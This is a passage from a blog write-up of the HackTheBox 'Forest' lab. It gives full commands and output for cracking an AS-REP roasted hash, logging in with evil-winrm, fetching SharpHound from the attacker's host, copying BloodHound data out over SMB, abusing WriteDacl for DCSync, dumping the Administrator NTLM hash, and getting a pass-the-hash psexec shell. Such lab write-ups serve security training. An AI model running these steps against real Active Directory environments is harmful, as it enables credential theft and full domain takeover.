$krb5asrep$23$svc-alfresco@HTB.LOCAL:b9a2ddb70e7e9fe0014a521553988f2f$87c7acec5bba4d6acf434f21185038907919dff2deaaab271c0810a2fd7f1f5400bc126d1a80461eae4d5efe3580a2d45536668c43c40b2ad5e2cb360ba4da847b94da72df2510eb30e8bb3f792ceff747eeb21565248dd182ddab0310634aadd5f216857b8ff5aa5536fc973ede0d4d5c4ddf704ef2181ec7f6ad6333cdbcce05f35953fbc7207f29c4c6a073949c3353bd07f58908327358939f9a743444a7b6821118d96fa06d97b76769a1c23fc078bce5199afb99a291801880da3803d96773049fd4c03d9f3372b2fcc78098761db85d06c5f6738c0e11d8e71f0eff2b2fbf9eb51872
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
</pre></table></code></div></div><p>User <code class="language-plaintext highlighter-rouge">svc-alfresco</code> found.</p><h4 id="crack-the-hash">Crack the hash.</h4><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/forest]
└─$ john svc-alfresco --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                       
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/forest]
└─$ john --show svc-alfresco                                                                                                                                              
$krb5asrep$23$svc-alfresco@HTB.LOCAL:s3rvice
</pre></table></code></div></div><p>I uncounted difficulties while using <code class="language-plaintext highlighter-rouge">hashcat</code> but <code class="language-plaintext highlighter-rouge">john</code> made it and the password found is <code class="language-plaintext highlighter-rouge">s3rvice</code></p><p>As long as we already have the credentials we can try to use <code class="language-plaintext highlighter-rouge">evil-winrm</code> for <code class="language-plaintext highlighter-rouge">Windows Remote Management</code></p><h2 id="user-account">User Account.</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/forest]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
</pre></table></code></div></div><p><strong>User flag</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; type user.txt
893b9ceea8f*********
</pre></table></code></div></div><h2 id="administrator-account">Administrator Account.</h2><p>Send <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> to the victim machine</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[/opt/BloodHound/Collectors]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.161 - - [13/Dec/2022 12:20:10] "GET /SharpHound.ps1 HTTP/1.1" 200 -


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; iwr http://10.10.14.4:8000/SharpHound.ps1 -outf SharpHound.ps1
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">SharpHound</code> is used to collect data from <code class="language-plaintext highlighter-rouge">BloodHound</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\Temp&gt; import-module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\Temp&gt; Invoke-Bloodhound -CollectionMethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\Temp&gt; ls


    Directory: C:\Users\svc-alfresco\appdata\local\Temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/13/2022   1:48 AM          18758 20221213014857_BloodHound.zip
-a----       12/13/2022   1:48 AM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----       12/13/2022   1:27 AM        1318097 SharpHound.ps1
</pre></table></code></div></div><h4 id="transfer-zip-file-to-the-attackers-machine">Transfer <code class="language-plaintext highlighter-rouge">.zip</code> file to the attacker’s machine</h4><ol><li>Use <code class="language-plaintext highlighter-rouge">smbserver</code> in Linux Machine.<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/forest/exploit]
└─$ /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username gems -password gems
</pre></table></code></div></div></li><li>In <code class="language-plaintext highlighter-rouge">evil-winrm</code><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; net use \\10.10.14.4\share /u:gems gems
The command completed successfully.
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; dir

     Directory: C:\Users\svc-alfresco\appdata\local\temp

 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----       12/13/2022   1:48 AM          18758 20221213014857_BloodHound.zip
 -a----       12/13/2022   1:48 AM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
 -a----       12/13/2022   1:27 AM        1318097 SharpHound.ps1
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; copy 20221213014857_BloodHound.zip \\10.10.14.4\share\
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; del 20221213014857_BloodHound.zip
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; net use /d \\10.10.14.4\share
 \\10.10.14.4\share was deleted successfully.
</pre></table></code></div></div></li><li><p>In Linux Machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(gemstone㉿hashghost)-[~/…/Machines/vip/forest/exploit]
 └─$ ls
 20221213014857_BloodHound.zip  BloodHound.py-Kerberos
</pre></table></code></div></div></li></ol><p>Load Data extracted from Windows Machine to Bloodhound</p><ol><li>Start <code class="language-plaintext highlighter-rouge">neo4j</code></li><li>Start <code class="language-plaintext highlighter-rouge">Bloodhound</code></li><li>Drag and drop zipped file to <code class="language-plaintext highlighter-rouge">Bloodhound</code></li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/forest/01.png" alt="image" /></p><p>Select shortest <code class="language-plaintext highlighter-rouge">Find Shortest Path to Domain Admins</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/forest/02.png" alt="image" /></p><p>Selecting for <code class="language-plaintext highlighter-rouge">Shortest Paths to High Value Targets</code> show as follows:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/forest/03.png" alt="image" /></p><p>One of the paths shows that the <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> group has <code class="language-plaintext highlighter-rouge">WriteDacl</code> privileges on the Domain. The<code class="language-plaintext highlighter-rouge"> WriteDACL</code> privilege gives a user the ability to add <code class="language-plaintext highlighter-rouge">ACLs</code> to an object. This means that we can add a user to this group and give them<code class="language-plaintext highlighter-rouge">DCSync</code> privileges. Go back to the <code class="language-plaintext highlighter-rouge">WinRM</code> shell and add a new user to <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> as well as the <code class="language-plaintext highlighter-rouge">Remote Management</code> Users group. <code class="language-plaintext highlighter-rouge">Account Operators</code> has Generic All privilege on the <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> group.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/forest/04.png" alt="image" /></p><ol><li>Create new user<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; net user gems gemstone /add /domain
The command completed successfully.
</pre></table></code></div></div></li><li>Add the created user into <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> group<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; net group "Exchange Windows Permissions" /add gems
The command completed successfully.
</pre></table></code></div></div></li><li>Abuse <code class="language-plaintext highlighter-rouge">WriteDacl</code><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; $SecPassword = ConvertTo-SecureString 'gemstone' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; $Cred = New-Object System.Management.Automation.PSCredential('HTB\gems', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
</pre></table></code></div></div></li></ol><p><strong>Results</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/vip/forest/exploit/PowerSploit]
└─$ /usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/gems:gemstone@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
gems:aes256-cts-hmac-sha1-96:e7498b475017f1a2713a52c0fc5d2a3b5ebf03bab9a5b30a166de83153ed71b7
[*] Cleaning up...
</pre></table></code></div></div><p>We found the administrator hash which is <code class="language-plaintext highlighter-rouge">32693b11e6aa90eb43d32c72a07ceea6</code></p><p>Checking if it is valid with <code class="language-plaintext highlighter-rouge">crackmapexec</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/forest/exploit]
└─$ crackmapexec smb 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
</pre></table></code></div></div><p>Login by <code class="language-plaintext highlighter-rouge">psexec</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/forest/exploit]
└─$ /usr/share/doc/python3-impacket/examples/psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161                                                                            
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file oGxXZAUn.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service CWzC on 10.10.10.161.....
[*] Starting service CWzC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; 
</pre></table></code></div></div><p><strong>Root flag</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>C:\Users\Administrator\Desktop&gt; type root.txt
451cc0a776e38***********
</pre></table></code></div></div><p>The end.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Mungu Nisaidie
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/htb-windows/'>HTB-Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/machines/" class="post-tag no-text-decoration" >Machines</a> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/password_cracking/" class="post-tag no-text-decoration" >PASSWORD_CRACKING</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1"></span> <span class="share-icons"> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/password_cracking/">PASSWORD_CRACKING</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/machines/">Machines</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/active/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 19, 2022 <i class="unloaded">2022-12-19T18:49:38+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active</h3><div class="text-muted small"><p> Enumeration Nmap Scanning Command 1 └─$ nmap -sC -sV 10.10.10.100 -oN nmap-scan Result 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 4...</p></div></div></a></div><div class="card"> <a href="/sauna/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 20, 2022 <i class="unloaded">2022-12-20T13:49:38+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sauna</h3><div class="text-muted small"><p> Enumeration Nmap Scanning Command 1 └─$ nmap -sC -sV 10.10.10.175 -oN nmap-scan Result 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # Nmap 7.93 scan i...</p></div></div></a></div><div class="card"> <a href="/blackfield/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 20, 2022 <i class="unloaded">2022-12-20T18:49:38+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BlackField</h3><div class="text-muted small"><p> Enumeration Command 1 nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap Scan Result 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # Nmap 7.93 scan ini...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/trick/" class="btn btn-outline-primary"><p>Trick</p></a> <a href="/active/" class="btn btn-outline-primary"><p>Active</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/hashghost21">Julius Soraely</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.com/badge/990235"></script></p></div><div class="footer-right"><p class="mb-0"><h4>H4cking is Fun</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/password_cracking/">PASSWORD_CRACKING</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/machines/">Machines</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
